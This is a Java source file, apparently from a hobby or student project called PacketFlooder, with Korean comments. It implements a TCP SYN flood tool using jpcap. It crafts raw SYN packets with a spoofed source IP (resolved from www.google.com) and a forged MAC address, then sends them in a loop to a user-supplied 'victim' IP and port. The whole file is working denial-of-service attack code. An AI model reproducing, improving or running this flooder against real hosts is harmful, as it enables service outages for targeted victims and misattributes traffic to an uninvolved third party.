package PacketFlooder;

import java.io.IOException;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.HashMap;

import PF_GUI.PF_GUI_NICList;
import PF_GUI.PF_GUI_Resource;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.TCPPacket;

/**
 * 
 * @author Myeong-Un Ryu
 * @version 1.0.0
 * @since 16.11.26
 * TCP Flooder를 위한 설정과 실제 패킷을 전송하는 클래스
 * 
 */

public class PF_SendTCP {

	/** NIC **/
	private jpcap.NetworkInterface m_dev;
	
	/** 발신지(공격자) IP Address **/
	private InetAddress m_src_ip;
	
	/** 발신지(공격자) MAC Address **/
	private byte[] m_src_mac;
	
	/** SYN Flooding을 위한 변조된 발신지(공격자) IP Address **/
	private InetAddress m_attack_src_ip;
	
	/** SYN Flooding을 위한 변조된 발신지(공격자)  MAC Address **/
	private byte[] m_attack_src_mac;
	
	/** SYN Flooding을 위한 변조된 발신지(공격자) Source port number **/
	private int m_src_port;

	/** SYN Flooding을 위한 SYN 값 설정 **/
	private boolean m_isSYN;

	/** SYN Flooding을 위한 Data 값 설정 **/
	private byte[] m_data;
	
	
	/** 수신지(피해자) IP Address **/
	private InetAddress m_des_ip;
	
	/** 수신지(피해자) MAC Address **/
	private byte[] m_des_mac;
	
	/** 수신지(피해자) Port number **/
	private int m_des_port;
	
	
	
	/** 초당 전송할 패킷의 양 **/
	public int m_pktsNum;
	
	/** 전손한 패킷의 양 **/
	public int m_pktsCount;
	
	/** 패킷 전송이 지속된 시간 **/
	private int m_seconds;
	
	
	/**
	 * TCP Flooder의 정보를 셋팅하는 메소드 지정된 디바이스가 있을 경우에만 true를 리턴
	 * @return boolean BOOLEAN타타입으로 리턴 
	 * @throws UnknownHostException 
	 * @throws NumberFormatException 
	 * @throws SocketException 
	 */
	public boolean set_PF_SendTCP(String ip, String port, int speed) throws NumberFormatException, UnknownHostException, SocketException 
	{
		
		// Device의 이름을 가져오기
		HashMap<String, NetworkInterface> imsi_map = PF_GUI_NICList.get_PF_GUI_NICList_Instance().m_Map_Device;

		// 선택된 Device의 NPF 정보를 가져오기 Device의 이름으로 map에서 찾아온다.
		m_dev = imsi_map.get(PF_GUI_NICList.get_PF_GUI_NICList_Instance().getSelectedValue());
		
		
		if(m_dev!=null) // 선택한 디바이스가 있을 경우만 실행 
		{
			
			// 발신지(공격자) IP Address 설정
			m_src_ip = InetAddress.getLocalHost();

			System.out.println(m_src_ip);
			// 발신지(공격자) MAC Address
			m_src_mac = java.net.NetworkInterface.getByInetAddress(m_src_ip).getHardwareAddress();
			
			// SYN Flooding을 위한 변조된 발신지(공격자) IP Address
			m_attack_src_ip = InetAddress.getByName("www.google.com");
			
			// SYN Flooding을 위한 변조된 발신지(공격자)  MAC Address
			m_attack_src_mac = new byte[]{(byte)0,(byte)1,(byte)2,(byte)3,(byte)4,(byte)5};
			
			// SYN Flooding을 위한 변조된 발신지(공격자) Source port number
			m_src_port = 12;

			// SYN Flooding을 위한 SYN 값 설정
			m_isSYN = true;

			// SYN Flooding을 위한 Data 값 설정
			m_data = ("myeonguni.com").getBytes();
			
			
			// 수신지(피해자) IP Address
			String[] ipArray = ip.split("\\.");
			m_des_ip = InetAddress.getByAddress(new byte[]{(byte)Integer.parseInt(ipArray[0]),(byte)Integer.parseInt(ipArray[1]),(byte)Integer.parseInt(ipArray[2]),(byte)Integer.parseInt(ipArray[3])});
			
			// 수신지(피해자) MAC Address
			// m_des_ip가 유효한 값이 아닐 경우에 대한 예외처리를 해야함 추후 수정할 것, 일단은 m_src_ip로 대체
			m_des_mac = java.net.NetworkInterface.getByInetAddress(m_src_ip).getHardwareAddress();
			
			// 수신지(피해자) Port number
			m_des_port = Integer.parseInt(port);
			
			
			// 초당 전송할 패킷의 양을 설정
			m_pktsNum = speed;
			
			// 패킷 전송
			try {
				send();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			return true;
		}
		else // 선택한 디바이스가 없다면 false를 리턴한다.
		{
			return false;
		}

	}// method end
	
	
	/**
	 * TCP Packet을 생성하여 전송하는 메소드
	 * @param nic 사용자에 의해 선택된 Device NPF 정보
	 * @throws IOException 
	 */
	public void send() throws IOException {
		
		// 패킷 전송 객체 생성
		JpcapSender sender = JpcapSender.openDevice(m_dev);
		
		/*
		 * 
		 * TCP Packet 생성 및 TCP header 설정 
		 * 1) src_port	- Source port number
		 * 2) dst_port	- Destination port number
		 * 3) sequence	- Seqence number
		 * 4) ack_num	- ACK number
		 * 5) urg		- URG flag
		 * 6) ack		- ACK flag
		 * 7) psh		- PSH flag
		 * 8) rst		- RST flag
		 * 9) syn		- SYN flag
		 * 10) fin		- FIN flag
		 * 11) rsv1		- RSV1 flag
		 * 12) rsv2		- RSV2 flag
		 * 13) window	- Window size
		 * 14) urgent	- Urgent pointer
		 * 
		 */
		TCPPacket packet = new TCPPacket(m_src_port,m_des_port,56,78,false,false,false,false,m_isSYN,true,true,true,10,10);
		
		
		/*
		 * 
		 * IP header 설정
		 * 1) d_flag	- IP flag bit: [D]elay,
		 * 2) t_flag	- IP flag bit: [T]hrough,
		 * 3) r_flag	- IP flag bit: [R]eliability,
		 * 4) rsv_tos	- Type of Service (TOS),
		 * 5) priority	- Priority,
		 * 6) rsv_frag	- Fragmentation Reservation flag,
		 * 7) dont_frag	- Don't fragment flag,
		 * 8) more_frag	- More fragment flag,
		 * 9) offset	- Offset,
		 * 10) ident	- Identifier,
		 * 11) ttl		- Time To Live,
		 * 12) protocol	- Protocol,
		 * 13) src		- Source IP address,
		 * 14) dst		- Destination IP address
		 * 
		 */
		packet.setIPv4Parameter(0,false,false,false,0,false,false,false,0,1010101,100,IPPacket.IPPROTO_TCP,
				m_attack_src_ip,m_des_ip);
		
		
		/*
		 * Payload 설정
		 */
		packet.data = m_data;
		
		
		/*
		 * Ethernet header 설정
		 */
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_IP;
		ether.src_mac = m_attack_src_mac;
		ether.dst_mac = m_des_mac;
		packet.datalink = ether;

		
		// 전송에 성공한 누적 패킷 수 초기화
		m_pktsCount = 0;
		
		/*
		 * 패킷을 전송하는 loop
		 */
		for(int i=0; i<m_pktsNum; i++)
		{
			// 패킷 전송
			sender.sendPacket(packet);
			
			// 전송에 성공한 누적 패킷 수 실시간 출력
			PF_GUI_Resource.get_Instance().m_lbl_sendPackets.setText(String.valueOf(++m_pktsCount));
		
			// ...
		}
		
	}


}//class end 